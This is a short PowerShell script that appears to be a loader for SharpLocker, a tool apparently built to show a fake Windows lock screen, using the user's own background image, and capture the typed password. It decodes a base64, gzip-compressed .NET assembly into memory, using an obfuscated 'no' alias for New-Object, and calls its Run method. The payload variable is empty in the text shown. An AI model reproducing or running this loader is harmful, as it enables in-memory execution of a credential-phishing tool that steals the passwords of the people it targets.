# This script embeds the full encoded SharpLocker payload (consumes ~11KB)
$b=""
nal no New-Object -F;$m=no IO.MemoryStream;(no IO.Compression.GZipStream((no IO.MemoryStream -ArgumentList @(,[Convert]::FromBase64String($b))), [IO.Compression.CompressionMode]::Decompress)).CopyTo($m);
[System.Reflection.Assembly]::Load($m.ToArray()) | Out-Null
[Windows.System.UserProfile.LockScreen,Windows.System.UserProfile,ContentType=WindowsRuntime] | Out-Null

#When you want to store the result in a variable
#$result = [SharpLockerLib.Runner]::Run([Windows.System.UserProfile.LockScreen]::OriginalImageFile.AbsolutePath)
#$result

# Version without user background
#[SharpLockerLib.Runner]::Run()

[SharpLockerLib.Runner]::Run([Windows.System.UserProfile.LockScreen]::OriginalImageFile.AbsolutePath)